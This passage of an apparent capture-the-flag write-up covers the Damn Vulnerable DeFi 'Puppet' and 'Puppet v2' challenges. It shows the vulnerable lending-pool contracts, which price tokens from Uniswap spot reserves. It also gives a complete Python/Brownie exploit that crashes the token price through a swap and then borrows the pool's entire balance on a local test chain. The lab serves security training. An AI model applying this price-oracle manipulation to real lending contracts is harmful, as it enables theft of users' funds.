class="function"><span class="params">address</span> =&gt;</span> uint256) public deposits;</span><br><span class="line">    address public immutable uniswapPair;</span><br><span class="line">    <span class="title class_">DamnValuableToken</span> public immutable token;</span><br><span class="line">    </span><br><span class="line">    event <span class="title class_">Borrowed</span>(address indexed account, uint256 depositRequired, uint256 borrowAmount);</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span> (address tokenAddress, address uniswapPairAddress) &#123;</span><br><span class="line">        token = <span class="title class_">DamnValuableToken</span>(tokenAddress);</span><br><span class="line">        uniswapPair = uniswapPairAddress;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allows borrowing `borrowAmount` of tokens by first depositing two times their value in ETH</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">borrow</span>(<span class="params">uint256 borrowAmount</span>) public payable nonReentrant &#123;</span><br><span class="line">        uint256 depositRequired = <span class="title function_">calculateDepositRequired</span>(borrowAmount);</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> &gt;= depositRequired, <span class="string">&quot;Not depositing enough collateral&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (msg.<span class="property">value</span> &gt; depositRequired) &#123;</span><br><span class="line">            <span class="title function_">payable</span>(msg.<span class="property">sender</span>).<span class="title function_">sendValue</span>(msg.<span class="property">value</span> - depositRequired);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        deposits[msg.<span class="property">sender</span>] = deposits[msg.<span class="property">sender</span>] + depositRequired;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Fails if the pool doesn&#x27;t have enough tokens in liquidity</span></span><br><span class="line">        <span class="built_in">require</span>(token.<span class="title function_">transfer</span>(msg.<span class="property">sender</span>, borrowAmount), <span class="string">&quot;Transfer failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">        emit <span class="title class_">Borrowed</span>(msg.<span class="property">sender</span>, depositRequired, borrowAmount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">calculateDepositRequired</span>(<span class="params">uint256 amount</span>) public view returns (uint256) &#123;</span><br><span class="line">        <span class="keyword">return</span> amount * <span class="title function_">_computeOraclePrice</span>() * <span class="number">2</span> / <span class="number">10</span> ** <span class="number">18</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_computeOraclePrice</span>(<span class="params"></span>) private view returns (uint256) &#123;</span><br><span class="line">        <span class="comment">// calculates the price of the token in wei according to Uniswap pair</span></span><br><span class="line">        <span class="keyword">return</span> uniswapPair.<span class="property">balance</span> * (<span class="number">10</span> ** <span class="number">18</span>) / token.<span class="title function_">balanceOf</span>(uniswapPair);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/**</span></span><br><span class="line"><span class="comment">     ... functions to deposit, redeem, repay, calculate interest, and so on ...</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>We must steal all the tokens from the <code>PuppetPool</code> contract to complete this challenge. Since the contract is calculating the price of a token from the <code>uniswap_exchange</code> ether balance divided by the token balance, we can swap our tokens to ether from <code>uniswap</code> to manipulate the price of the token in <code>PuppetPool</code>‘s <code>borrow()</code> function and get all the tokens with a low price.</p>
<h3 id="Puppet-py"><a href="#Puppet-py" class="headerlink" title="Puppet.py"></a>Puppet.py</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal</span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> Contract, accounts, DamnValuableToken, PuppetPool, chain, Wei</span><br><span class="line"></span><br><span class="line">RANDOM_ADDRESS = <span class="string">&#x27;0x5832727e34162736F3e7082EDad9DCfD76e15D0a&#x27;</span></span><br><span class="line">RANDOM_ADDRESS_PK = <span class="string">&#x27;57f7f022e5941d0573114e2aab6e08aeb9a6f28b42d48e63a374783d7f1fdadb&#x27;</span></span><br><span class="line"></span><br><span class="line">UNISWAP_INITIAL_TOKEN_RESERVE = Web3.toWei(<span class="number">10</span>, <span class="string">&#x27;ether&#x27;</span>)</span><br><span class="line">UNISWAP_INITIAL_ETH_RESERVE = Web3.toWei(<span class="number">10</span>, <span class="string">&#x27;ether&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ATTACKER_INITIAL_TOKEN_BALANCE = Web3.toWei(<span class="number">1000</span>, <span class="string">&#x27;ether&#x27;</span>)</span><br><span class="line">ATTACKER_INITIAL_ETH_BALANCE = Web3.toWei(<span class="number">25</span>, <span class="string">&#x27;ether&#x27;</span>)</span><br><span class="line">POOL_INITIAL_TOKEN_BALANCE = Web3.toWei(<span class="number">100000</span>, <span class="string">&#x27;ether&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_json</span>(<span class="params">json_file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;./scripts/build-uniswap-v1/<span class="subst">&#123;json_file&#125;</span>&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        contract_metadata = json.loads(f.read())</span><br><span class="line">        contract_abi = contract_metadata[<span class="string">&#x27;abi&#x27;</span>]</span><br><span class="line">        contract_bytecode = contract_metadata[<span class="string">&#x27;evm&#x27;</span>][<span class="string">&#x27;bytecode&#x27;</span>][<span class="string">&#x27;object&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> contract_abi, contract_bytecode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deploy_bytecode</span>(<span class="params">contract_abi, contract_bytecode</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment"># This will connect to Brownie&#x27;s ganache instance</span></span><br><span class="line">    w3_client = Web3(Web3.HTTPProvider(<span class="string">&#x27;http://0.0.0.0:8545&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    temp_contract = w3_client.eth.contract(</span><br><span class="line">        abi=contract_abi, bytecode=contract_bytecode)</span><br><span class="line">    n = w3_client.eth.get_transaction_count(RANDOM_ADDRESS)</span><br><span class="line">    tx = temp_contract.constructor().buildTransaction(</span><br><span class="line">        &#123;<span class="string">&#x27;from&#x27;</span>: RANDOM_ADDRESS, <span class="string">&#x27;nonce&#x27;</span>: n, <span class="string">&#x27;gasPrice&#x27;</span>: w3_client.eth.gas_price&#125;</span><br><span class="line">    )</span><br><span class="line">    signed_tx = w3_client.eth.account.sign_transaction(</span><br><span class="line">        tx, private_key=RANDOM_ADDRESS_PK)</span><br><span class="line"></span><br><span class="line">    accounts[<span class="number">0</span>].transfer(RANDOM_ADDRESS, <span class="string">&#x27;1 ether&#x27;</span>)</span><br><span class="line">    txh = w3_client.eth.send_raw_transaction(signed_tx.rawTransaction)</span><br><span class="line">    tx_receipt = w3_client.eth.wait_for_transaction_receipt(txh)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> tx_receipt.contractAddress</span><br><span class="line"></span><br><span class="line"><span class="comment"># From: https://github.com/wuwe1/damn-vulnerable-defi-brownie/blob/ec115648cc319811ef09519c433bce9772753cd9/tests/test_puppet.py#L48</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_token_to_eth_input_price</span>(<span class="params">token_sold, token_in_reserve, ether_in_reserve</span>):</span><br><span class="line">    token_sold = Decimal(token_sold)</span><br><span class="line">    token_in_reserve = Decimal(token_in_reserve)</span><br><span class="line">    ether_in_reserve = Decimal(ether_in_reserve)</span><br><span class="line">    <span class="keyword">return</span> Wei(</span><br><span class="line">        token_sold</span><br><span class="line">        * <span class="number">997</span></span><br><span class="line">        * ether_in_reserve</span><br><span class="line">        / (token_in_reserve * <span class="number">1000</span> + token_sold * <span class="number">997</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deploy</span>():</span><br><span class="line">    <span class="comment"># deploy script is from https://github.com/nahueldsanchez/dvd_brownie</span></span><br><span class="line"></span><br><span class="line">    damn_valuable_token = DamnValuableToken.deploy(&#123;<span class="string">&#x27;from&#x27;</span>: accounts[<span class="number">0</span>]&#125;)</span><br><span class="line"></span><br><span class="line">    uniswap_factory_abi, uniswap_factory_bytecode = load_json(</span><br><span class="line">        <span class="string">&#x27;UniswapV1Factory.json&#x27;</span>)</span><br><span class="line">    uniswap_factory_address = deploy_bytecode(</span><br><span class="line">        uniswap_factory_abi, uniswap_factory_bytecode</span><br><span class="line">    )</span><br><span class="line">    uniswap_factory = Contract.from_abi(</span><br><span class="line">        <span class="string">&#x27;UniswapV1Factory&#x27;</span>, uniswap_factory_address, uniswap_factory_abi</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    uniswap_exchange_abi, uniswap_exchange_bytecode = load_json(</span><br><span class="line">        <span class="string">&#x27;UniswapV1Exchange.json&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    uniswap_exchange_address = deploy_bytecode(</span><br><span class="line">        uniswap_exchange_abi, uniswap_exchange_bytecode</span><br><span class="line">    )</span><br><span class="line">    uniswap_exchange_template = Contract.from_abi(</span><br><span class="line">        <span class="string">&#x27;UniswapV1ExchangeTemplate&#x27;</span>, uniswap_exchange_address, uniswap_exchange_abi</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    uniswap_factory.initializeFactory(</span><br><span class="line">        uniswap_exchange_template, &#123;<span class="string">&#x27;from&#x27;</span>: accounts[<span class="number">0</span>]&#125;)</span><br><span class="line">    tx = uniswap_factory.createExchange(</span><br><span class="line">        damn_valuable_token, &#123;<span class="string">&#x27;from&#x27;</span>: accounts[<span class="number">0</span>]&#125;)</span><br><span class="line"></span><br><span class="line">    new_exchange_address = tx.events[<span class="string">&#x27;NewExchange&#x27;</span>][<span class="string">&#x27;exchange&#x27;</span>]</span><br><span class="line">    uniswap_exchange = Contract.from_abi(</span><br><span class="line">        <span class="string">&#x27;UniswapV1Exchange&#x27;</span>, new_exchange_address, uniswap_exchange_abi</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    lending_pool = PuppetPool.deploy(</span><br><span class="line">        damn_valuable_token, new_exchange_address, &#123;<span class="string">&#x27;from&#x27;</span>: accounts[<span class="number">0</span>]&#125;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    damn_valuable_token.approve(</span><br><span class="line">        new_exchange_address, UNISWAP_INITIAL_TOKEN_RESERVE)</span><br><span class="line"></span><br><span class="line">    deadline = chain[-<span class="number">1</span>].timestamp * <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    uniswap_exchange.addLiquidity(</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        UNISWAP_INITIAL_TOKEN_RESERVE,</span><br><span class="line">        deadline,</span><br><span class="line">        &#123;<span class="string">&#x27;value&#x27;</span>: UNISWAP_INITIAL_ETH_RESERVE, <span class="string">&#x27;from&#x27;</span>: accounts[<span class="number">0</span>]&#125;,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> uniswap_exchange.getTokenToEthInputPrice(</span><br><span class="line">        Web3.toWei(<span class="number">1</span>, <span class="string">&#x27;ether&#x27;</span>)</span><br><span class="line">    ) == calculate_token_to_eth_input_price(</span><br><span class="line">        Web3.toWei(<span class="number">1</span>, <span class="string">&#x27;ether&#x27;</span>),</span><br><span class="line">        UNISWAP_INITIAL_TOKEN_RESERVE,</span><br><span class="line">        UNISWAP_INITIAL_ETH_RESERVE,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    ATTACKER_ACCOUNT = accounts.add()</span><br><span class="line">    accounts[<span class="number">1</span>].transfer(ATTACKER_ACCOUNT, <span class="string">&#x27;25 ether&#x27;</span>)</span><br><span class="line">    <span class="keyword">assert</span> ATTACKER_ACCOUNT.balance() == ATTACKER_INITIAL_ETH_BALANCE</span><br><span class="line"></span><br><span class="line">    damn_valuable_token.transfer(</span><br><span class="line">        ATTACKER_ACCOUNT, ATTACKER_INITIAL_TOKEN_BALANCE)</span><br><span class="line">    damn_valuable_token.transfer(lending_pool, POOL_INITIAL_TOKEN_BALANCE)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> lending_pool.calculateDepositRequired(</span><br><span class="line">        Web3.toWei(<span class="number">1</span>, <span class="string">&#x27;ether&#x27;</span>)) == Web3.toWei(<span class="number">2</span>, <span class="string">&#x27;ether&#x27;</span>)</span><br><span class="line">    <span class="keyword">assert</span> lending_pool.calculateDepositRequired(</span><br><span class="line">        POOL_INITIAL_TOKEN_BALANCE) == POOL_INITIAL_TOKEN_BALANCE * <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> uniswap_exchange, lending_pool, damn_valuable_token, ATTACKER_ACCOUNT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">token, lending_pool, uniswap_exchange, attacker</span>):</span><br><span class="line">    token.approve(uniswap_exchange, ATTACKER_INITIAL_TOKEN_BALANCE, &#123;</span><br><span class="line">                  <span class="string">&#x27;from&#x27;</span>: attacker&#125;)</span><br><span class="line">    uniswap_exchange.tokenToEthSwapInput(</span><br><span class="line">        ATTACKER_INITIAL_TOKEN_BALANCE, <span class="number">10</span>**<span class="number">18</span>, chain[-<span class="number">1</span>].timestamp * <span class="number">2</span>, &#123;<span class="string">&#x27;from&#x27;</span>: attacker&#125;)</span><br><span class="line">    deposit_required = lending_pool.calculateDepositRequired(</span><br><span class="line">        POOL_INITIAL_TOKEN_BALANCE)</span><br><span class="line">    lending_pool.borrow(POOL_INITIAL_TOKEN_BALANCE, &#123;</span><br><span class="line">                        <span class="string">&#x27;from&#x27;</span>: attacker, <span class="string">&#x27;value&#x27;</span>: deposit_required&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">after</span>(<span class="params">token, lending_pool, attacker</span>):</span><br><span class="line">    <span class="keyword">assert</span> token.balanceOf(lending_pool) == <span class="number">0</span></span><br><span class="line">    <span class="keyword">assert</span> token.balanceOf(attacker) == POOL_INITIAL_TOKEN_BALANCE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    uniswap_exchange, lending_pool, damn_valuable_token, ATTACKER_ACCOUNT = deploy()</span><br><span class="line">    exploit(damn_valuable_token, lending_pool,</span><br><span class="line">            uniswap_exchange, ATTACKER_ACCOUNT)</span><br><span class="line">    after(damn_valuable_token, lending_pool, ATTACKER_ACCOUNT)</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Puppet-v2"><a href="#Puppet-v2" class="headerlink" title="Puppet v2"></a>Puppet v2</h2><p>The developers of the last lending pool are saying that they’ve learned the lesson. And just released a new version!</p>
<p>Now they’re using a Uniswap v2 exchange as a price oracle, along with the recommended utility libraries. That should be enough.</p>
<p>You start with 20 ETH and 10000 DVT tokens in balance. The new lending pool has a million DVT tokens in balance. You know what to do ;)</p>
<h3 id="PuppetV2Pool-sol"><a href="#PuppetV2Pool-sol" class="headerlink" title="PuppetV2Pool.sol"></a>PuppetV2Pool.sol</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@uniswap/v2-periphery/contracts/libraries/SafeMath.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">IERC20</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">transfer</span>(<span class="params">address to, uint256 amount</span>) external returns (bool);</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">transferFrom</span>(<span class="params">address <span class="keyword">from</span>, address to, uint256 amount</span>) external returns (bool);</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">balanceOf</span>(<span class="params">address account</span>) external returns (uint256);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span> <span class="variable">PuppetV2Pool</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract <span class="title class_">PuppetV2Pool</span> &#123;</span><br><span class="line">    using <span class="title class_">SafeMath</span> <span class="keyword">for</span> uint256;</span><br><span class="line"></span><br><span class="line">    address private _uniswapPair;</span><br><span class="line">    address private _uniswapFactory;</span><br><span class="line">    <span class="title class_">IERC20</span> private _token;</span><br><span class="line">    <span class="title class_">IERC20</span> private _weth;</span><br><span class="line">    </span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> uint256) public deposits;</span><br><span class="line">        </span><br><span class="line">    event <span class="title class_">Borrowed</span>(address indexed borrower, uint256 depositRequired, uint256 borrowAmount, uint256 timestamp);</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span> (</span><br><span class="line">        address wethAddress,</span><br><span class="line">        address tokenAddress,</span><br><span class="line">        address uniswapPairAddress,</span><br><span class="line">        address uniswapFactoryAddress</span><br><span class="line">    ) public &#123;</span><br><span class="line">        _weth = <span class="title class_">IERC20</span>(wethAddress);</span><br><span class="line">        _token = <span class="title class_">IERC20</span>(tokenAddress);</span><br><span class="line">        _uniswapPair = uniswapPairAddress;</span><br><span class="line">        _uniswapFactory = uniswapFactoryAddress;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@notice</span> Allows borrowing `borrowAmount` of tokens by first depositing three times their value in WETH</span></span><br><span class="line"><span class="comment">     *         Sender must have approved enough WETH in advance.</span></span><br><span class="line"><span class="comment">     *         Calculations assume that WETH and borrowed token have same amount of decimals.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">borrow</span>(<span class="params">uint256 borrowAmount</span>) external &#123;</span><br><span class="line">        <span class="built_in">require</span>(_token.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)) &gt;= borrowAmount, <span class="string">&quot;Not enough token balance&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Calculate how much WETH the user must deposit</span></span><br><span class="line">        uint256 depositOfWETHRequired = <span class="title function_">calculateDepositOfWETHRequired</span>(borrowAmount);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Take the WETH</span></span><br><span class="line">        _weth.<span class="title function_">transferFrom</span>(msg.<span class="property">sender</span>, <span class="title function_">address</span>(<span class="variable language_">this</span>), depositOfWETHRequired);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// internal accounting</span></span><br><span class="line">        deposits[msg.<span class="property">sender</span>] += depositOfWETHRequired;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">require</span>(_token.<span class="title function_">transfer</span>(msg.<span class="property">sender</span>, borrowAmount));</span><br><span class="line"></span><br><span class="line">        emit <span class="title class_">Borrowed</span>(msg.<span class="property">sender</span>, depositOfWETHRequired, borrowAmount, block.<span class="property">timestamp</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">calculateDepositOfWETHRequired</span>(<span class="params">uint256 tokenAmount</span>) public view returns (uint256) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">_getOracleQuote</span>(tokenAmount).<span class="title function_">mul</span>(<span class="number">3</span>) / (<span class="number">10</span> ** <span class="number">18</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Fetch the price from Uniswap v2 using the official libraries</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_getOracleQuote</span>(<span class="params">uint256 amount</span>) private view returns (uint256) &#123;</span><br><span class="line">        (uint256 reservesWETH, uint256 reservesToken) = <span class="title class_">UniswapV2Library</span>.<span class="title function_">getReserves</span>(</span><br><span class="line">            _uniswapFactory, <span class="title function_">address</span>(_weth), <span class="title function_">address</span>(_token)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">UniswapV2Library</span>.<span class="title function_">quote</span>(amount.<span class="title function_">mul</span>(<span class="number">10</span> ** <span class="number">18</span>), reservesToken, reservesWETH);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>This challenge is the extended version of the previous, but a similar exploit would work.</p>
<h3 id="puppet-v2-py"><a href="#puppet-v2-py" class="headerlink" title="puppet-v2.py"></a>puppet-v2.py</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> accounts, Contract, PuppetV2Pool, DamnValuableToken, WETH9, chain</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Uniswap v2 exchange will start with 100 tokens and 10 WETH 